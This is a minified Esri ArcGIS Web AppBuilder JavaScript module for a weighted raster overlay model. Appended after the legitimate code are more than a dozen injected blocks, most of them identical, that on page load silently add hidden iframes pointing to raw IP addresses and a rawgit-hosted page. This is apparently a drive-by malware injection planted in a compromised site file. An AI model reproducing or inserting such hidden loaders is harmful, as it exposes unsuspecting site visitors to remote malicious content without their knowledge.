// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/string dojo/number esri/request esri/layers/RasterFunction ./rasterFunctions".split(" "),function(v,m,k,p,w,r,t,x){var y=function(a,b){var c;if(!a||!b)return!1;c=a.length;if(c!==b.length)return!1;for(var d=0;d<c;d++)if(a[d]instanceof Array&&b[d]instanceof Array){if(!a[d].compare(b[d]))return!1}else if(a[d]!==b[d])return!1;return!0},z=function(a){try{if(a.attributes&&"ForestFragmentation_US_USFS_2002"===a.attributes.Name&&"Forest Fragmentation"===
a.attributes.Title&&49===a.attributes.OBJECTID)return null}catch(h){}a=a.attributes;var b,c,d,f,e,g;a&&(g={id:a.OBJECTID,name:a.Name,title:a.Title,url:a.Url,metadata:a.Metadata},a.InputRanges&&a.InputRanges.split&&"undefined"!==typeof a.OutputValues&&a.OutputValues.split&&(b=k.map(a.InputRanges.split(","),function(a){return parseFloat(a.trim())}),c=k.map(a.OutputValues.split(","),function(a){return parseInt(a.trim(),10)}),a.RangeLabels&&a.RangeLabels.split&&(f=k.map(a.RangeLabels.split(","),function(a){return a.trim()}))),
a.NoDataRanges&&a.NoDataRanges.split&&(d=k.map(a.NoDataRanges.split(","),function(a){return parseFloat(a.trim())}),a.NoDataRangeLabels&&a.NoDataRangeLabels.split&&(e=k.map(a.NoDataRangeLabels.split(","),function(a){return a.trim()}))),g.remapRanges=n.createRemapRanges(b,c,d,{labels:f,noDataLabels:e}));return g},u=function(a){return k.map(a.colors,function(a){return[a.value].concat(a.rgb)})},q=function(a,b){var c=[],d=0;a&&a.overlayLayers&&a.overlayLayers.push?0<a.overlayLayers.length?(k.forEach(a.overlayLayers,
function(a,e){d+=a.weight;a.remapRanges&&a.remapRanges.push&&0<a.remapRanges.length?k.forEach(a.remapRanges,function(a,d){(isNaN(a.outputValue)||null===a.outputValue)&&c.push(p.substitute(b.wro.validation.overlayLayerOutputInvalid,[e,d]));(isNaN(a.inputMin)||null===a.inputMin||isNaN(a.inputMax)||null===a.inputMax||a.inputMin>a.inputMax)&&c.push(p.substitute(b.wro.validation.overlayLayerInputInvalid,[e,d]))}):c.push(p.substitute(b.wro.validation.overlayLayerRangesMissing,[e]))}),100!==d&&c.push(b.wro.validation.overlayLayerWeight)):
c.push(b.wro.validation.overlayLayerRequired):c.push(b.wro.validation.overlayLayerNotDefined);return c},A=function(a,b,c){a+="/computeHistograms";var d={geometryType:"esriGeometryPolygon",f:"json"};d.geometry=window.JSON.stringify(b);c&&(c.renderingRule&&(d.renderingRule=window.JSON.stringify(c.renderingRule)),c.pixelSize&&(d.pixelSize=window.JSON.stringify(c.pixelSize)));return r({url:a,content:d,handleAs:"json",callbackParamName:"callback"})},n={rasterFunctionArgumentsToRemapRanges:function(a,b){var c,
d,f,e;a&&(d=m.mixin({inputRangesArgumentName:"InputRanges",outputValuesArgumentName:"OutputValues",noDataRangesArgumentName:"NoDataRanges",labelsArgumentName:"Labels",noDataLabelsArgumentName:"NoDataLabels"},b),b=a[d.inputRangesArgumentName],c=a[d.outputValuesArgumentName],f=a[d.noDataRangesArgumentName],e=a[d.labelsArgumentName],a=a[d.noDataLabelsArgumentName],c=this.createRemapRanges(b,c,f,{labels:e,noDataLabels:a,sortBy:"inputMin"}));return c},createRemapRanges:function(a,b,c,d){var f=[],e=!1,
g,h,l;d&&(g=d.labels,h=d.noDataLabels,l=d.sortBy);a&&a.push&&b&&b.push&&a.length===2*b.length&&(e=g&&g.push&&g.length===b.length,k.forEach(b,function(b,c){var d=2*c;b={inputMin:a[d],inputMax:a[d+1],outputValue:b,originalOutputValue:b};b.label=e?g[c]:this.getRangeString(b.inputMin,b.inputMax);f.push(b)},this));c&&c.push&&0<c.length&&(e=h&&h.push&&h.length===c.length/2,k.forEach(c,function(a,b){0===b%2&&(a={inputMin:a,inputMax:c[b+1],outputValue:0,originalOutputValue:0},a.label=e?h[b]:this.getRangeString(a.inputMin,
a.inputMax),f.push(a))},this));if(0<f.length)return l&&f.sort(function(a,b){return a[l]<b[l]?-1:a[l]>b[l]?1:0}),f},getRangeString:function(a,b){return a===b?a+"":a+" - "+b},remapRangesToRasterFunctionArguments:function(a,b){var c,d,f,e,g,h;a&&(c={},b=m.mixin({includeLabels:!0,inputRangesArgumentName:"InputRanges",outputValuesArgumentName:"OutputValues",noDataRangesArgumentName:"NoDataRanges",labelsArgumentName:"Labels",noDataLabelsArgumentName:"NoDataLabels"},b),d=[],f=[],e=[],g=[],h=[],k.forEach(a,
function(a){var b=a.label||this.getRangeString(a.inputMin,a.inputMax);a.outputValue?(d.push(a.inputMin),d.push(a.inputMax),f.push(a.outputValue),g.push(b)):(e.push(a.inputMin),e.push(a.inputMax),h.push(b))},this),0<f.length&&(c[b.inputRangesArgumentName]=d,c[b.outputValuesArgumentName]=f,b.includeLabels&&(c[b.labelsArgumentName]=g)),0<e.length&&(c[b.noDataRangesArgumentName]=e,b.includeLabels&&(c[b.noDataLabelsArgumentName]=h)));return c},getRemapRangeByValue:function(a,b){var c;(b||0===b)&&k.some(a,
function(a){return b===a.inputMin&&b===a.inputMax||b>=a.inputMin&&b<a.inputMax?(c=a,!0):!1});return c},findRemapRange:function(a,b){var c,d;if(a&&b)return k.some(a,function(a){if((b.inputMin||0===b.inputMin)&&(b.inputMax||0===b.inputMax))return(c=a.inputMin===b.inputMin&&a.inputMax===b.inputMax)&&(d=a),c}),d}};return v([],{context:null,i18n:null,constructor:function(a,b){b=b||{};this.imageServiceLayer=a;this.rasterFunctionName=b.rasterFunctionName||"";this.histogramRasterFunctionName=b.histogramRasterFunctionName||
"";this.rastersInFunction=b.rastersInFunction||0;this.variableName=b.variableName||"Raster";this.colorMapArgName=b.colorMapArgName||"Colormap";this.dummyRasterId=b.dummyRasterId||1;this.colormapDefinitions=b.colormapDefinitions||[];this.argumentNamePrefixes=m.mixin({id:"Raster",weight:"Weight_Raster",inputRanges:"InputRanges_Raster",outputValues:"OutputValues_Raster",noDataRanges:"NoDataRanges_Raster",labels:"Labels_Raster",noDataLabels:"NoDataLabels"},b.argumentNamePrefixes);this.queryParameters=
m.mixin({where:"1\x3d1",outFields:["*"],returnGeometry:!1},b.queryParameters);this.rasterLayers=b.rasterLayers||[]},initRasterLayers:function(a){var b=this;return this.queryRasters().then(function(c){return b._initRasterLayers(c.features,a)})},queryRasters:function(a){var b=this.imageServiceLayer.url+"/query";a=m.mixin(m.mixin({f:"json"},a),this.queryParameters);a.outFields&&a.outFields.join&&(a.outFields=a.outFields.join(","));return r({url:b,content:a,handleAs:"json",callbackParamName:"callback"})},
_initRasterLayers:function(a,b){var c=this.context;try{this.dummyRasterId=1,this.imageServiceLayer&&this.imageServiceLayer.url&&-1!==this.imageServiceLayer.url.indexOf("//landscape3.arcgis.com")&&(this.dummyRasterId=53)}catch(e){}var d=this,f;b=(b||{}).featureCompareFunc||function(a,b){return a.attributes.Title<b.attributes.Title?-1:a.attributes.Title>b.attributes.Title?1:0};a&&a.length&&0<a.length&&a[0].attributes&&(d.rasterLayers&&d.rasterLayers.push?d.rasterLayers.length=0:d.rasterLayers=[],b&&
a.sort(b),k.forEach(a,function(a){if(f=z(a))f.url=c.checkMixedContent(f.url),d.rasterLayers.push(f)}));return d.rasterLayers},createNewModel:function(){var a={overlayLayers:[]};this.colormapDefinitions&&this.colormapDefinitions instanceof Array&&0<this.colormapDefinitions.length&&(a.colormapDefinition=this.colormapDefinitions[0]);return a},getRasterLayer:function(a){var b;k.some(this.rasterLayers,function(c){if(c.id===a)return b=c,!1});return b},setOverlayLayerDefaults:function(a,b){b&&(b.remapRanges&&
a.remapRanges&&k.forEach(b.remapRanges,function(b){var c;b.label&&(c=n.findRemapRange(a.remapRanges,{inputMin:b.inputMin,inputMax:b.inputMax}))&&(c.label=b.label)},this),a.title=b.title)},operationalLayersToModel:function(a){var b,c=this.rasterFunctionName;c&&k.some(a,function(a){return a.renderingRule&&a.renderingRule&&a.renderingRule.rasterFunction===c?(b=a,!0):!1},this);return this.imageServiceLayerToModel(b)},imageServiceLayerToModel:function(a){var b=this,c,d,f,e,g;e=a.renderingRule;if(a&&e){c=
{overlayLayers:[]};if(this.rasterFunctionName===e.rasterFunction){f=new RegExp("^"+this.argumentNamePrefixes.id+"[1-9]+$");e=e.rasterFunctionArguments;a.remapRangeLabels&&m.mixin(e,a.remapRangeLabels);a.noDataRangeLabels&&m.mixin(e,a.noDataRangeLabels);for(var h in e)h.match(f)?(g=h.replace(this.argumentNamePrefixes.id,""),d={id:parseInt(e[h].replace("$",""),10)},a=this.argumentNamePrefixes.weight+g,d.weight=e[a],d.weight&&0<d.weight&&(d.weight*=100,d=m.mixin(this.getRasterLayer(d.id)||{},d),d.remapRanges=
n.rasterFunctionArgumentsToRemapRanges(e,{inputRangesArgumentName:this.argumentNamePrefixes.inputRanges+g,outputValuesArgumentName:this.argumentNamePrefixes.outputValues+g,noDataRangesArgumentName:this.argumentNamePrefixes.noDataRanges+g,labelsArgumentName:this.argumentNamePrefixes.labels+g,noDataLabelsArgumentName:this.argumentNamePrefixes.noDataLabels+g}),c.overlayLayers.push(d))):h===this.colorMapArgName&&(c.colormapDefinition=this.findColormapDefinition(e[h]))}else f=e,e=f.rasterFunctionArguments,
"Colormap"===f.rasterFunction&&(c.colormapDefinition=this.findColormapDefinition(e.Colormap),f=e.Raster,e=f.rasterFunctionArguments),"Local"===f.rasterFunction&&49===e.Operation?(f=e.Rasters[0],e=f.rasterFunctionArguments):"Local"===f.rasterFunction&&48===e.Operation&&(e.Operation=49,f=e.Rasters[0],e=f.rasterFunctionArguments),"Local"===f.rasterFunction&&55===e.Operation&&(c.overlayLayers=k.map(e.Rasters,function(a){var c={};k.forEach(a.rasterFunctionArguments.Rasters,function(a){isNaN(a)?(c.id=parseInt(a.rasterFunctionArguments.Raster.substr(1),
10),c=m.mixin(b.getRasterLayer(c.id)||{},c),c.remapRanges=n.rasterFunctionArgumentsToRemapRanges(a.rasterFunctionArguments)):c.weight=100*a});return c}));return c}},findColormapDefinition:function(a){var b;k.some(this.colormapDefinitions,function(c){var d=!1;return(d=k.every(c.colors,function(b,c){return y([b.value].concat(b.rgb),a[c])}))?(b=c,!0):!1});return b},modelToOperationalLayers:function(a,b){return[this.modelToImageServiceLayer(a,b)]},modelToImageServiceLayer:function(a,b){var c={id:this.imageServiceLayer.id,
url:this.imageServiceLayer.url,opacity:this.imageServiceLayer.opacity,title:"Weighted Overlay Model"};a=this.getRasterFunction(a.overlayLayers,a.colormapDefinition,{includeLabels:!0});var d={},f={},e;for(e in a.arguments)0===e.indexOf(this.argumentNamePrefixes.labels)?(d[e]=a.arguments[e],delete a.arguments[e]):0===e.indexOf(this.argumentNamePrefixes.noDataLabels)&&(f[e]=a.arguments[e],delete a.arguments[e]);c.renderingRule=a.toJson();c.remapRangeLabels=d;c.noDataRangeLabels=f;b&&b.modelTitle&&(c.title=
b.modelTitle);return c},getRasterFunction:function(a,b,c){var d=[];k.forEach(a,function(a){0<a.weight&&d.push(a)});if(10.3<=this.imageServiceLayer.version){var f=k.map(d,function(a){var b=n.remapRangesToRasterFunctionArguments(a.remapRanges);b.Raster="$"+a.id;b.weight=a.weight/100;return b}),e;b&&(e=u(b));b=x.createWeightedSumParams(f,e);return new t(b)}e=new t;a=d.length;var g={};c=m.mixin({rasterFunctionName:this.rasterFunctionName,rastersInFunction:this.rastersInFunction,argumentNamePrefixes:this.argumentNamePrefixes,
variableName:this.variableName,dummyRasterId:this.dummyRasterId,includeLabels:!1},c);var h;e.functionName=c.rasterFunctionName;c.variableName&&(e.variableName=c.variableName);for(var l=1;l<=c.rastersInFunction;l++)h=l<=a?d[l-1]:{id:c.dummyRasterId,weight:0},g[c.argumentNamePrefixes.id+l]="$"+h.id,g[c.argumentNamePrefixes.weight+l]=w.round(h.weight/100,2),0<h.weight&&h.remapRanges&&(h=n.remapRangesToRasterFunctionArguments(h.remapRanges,{includeLabels:c.includeLabels,inputRangesArgumentName:c.argumentNamePrefixes.inputRanges+
l,outputValuesArgumentName:c.argumentNamePrefixes.outputValues+l,noDataRangesArgumentName:c.argumentNamePrefixes.noDataRanges+l,labelsArgumentName:c.argumentNamePrefixes.labels+l,noDataLabelsArgumentName:c.argumentNamePrefixes.noDataLabels+l}),m.mixin(g,h));if(this.colorMapArgName){b&&(f=u(b));if(!f)throw this.i18n.wro.validation.requiresColormap;g[this.colorMapArgName]=f}e.arguments=g;return e},validateModel:function(a){a=q(a,this.i18n);return{isValid:1>a.length,modelErrors:a}},runModel:function(a){var b;
if(this.imageServiceLayer)if(b=q(a,this.i18n),1>b.length)this.imageServiceLayer.setRenderingRule(this.getRasterFunction(a.overlayLayers,a.colormapDefinition));else throw this.context.showMessages(this.i18n.wro.validation.createModelError,"",b),this.wro.validation.invalidModel+":\n\n"+b.join("\n");else throw this.i18n.wro.validation.imageServiceNotDefined;},clearModel:function(){this.imageServiceLayer&&null!==this.imageServiceLayer.renderingRule&&this.imageServiceLayer.setRenderingRule(null)},getHistogram:function(a,
b,c){var d=m.mixin({},c);if(this.histogramRasterFunctionName){if(this.imageServiceLayer){c=q(a,this.i18n);if(1>c.length)return d.renderingRule=this.getRasterFunction(a.overlayLayers,a.colormapDefinition,{rasterFunctionName:this.histogramRasterFunctionName}).toJson(),A(this.imageServiceLayer.url,b,d).then(function(a){return a.histograms[0]});throw this.i18n.wro.validation.invalidModel+":\n\n"+c.join("\n");}throw this.i18n.wro.validation.imageLayerNotDefined;}throw this.i18n.wro.validation.histogramNotDefined;
},getModelPixelSize:function(a,b){var c=this.imageServiceLayer;b=m.mixin({width:c.maxImageWidth,height:c.maxImageHeight},b);var d=Math.max(c.pixelSizeX,Math.ceil(a.getWidth()/b.width));a=Math.max(c.pixelSizeY,Math.ceil(a.getHeight()/b.height));b.forceSquare?(a={x:Math.max(d,a)},a.y=a.x):a={x:d,y:a};return a},getColormapDefinition:function(a){var b;k.some(this.colormapDefinitions,function(c){if(c.id===a)return b=c,!1});return b}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});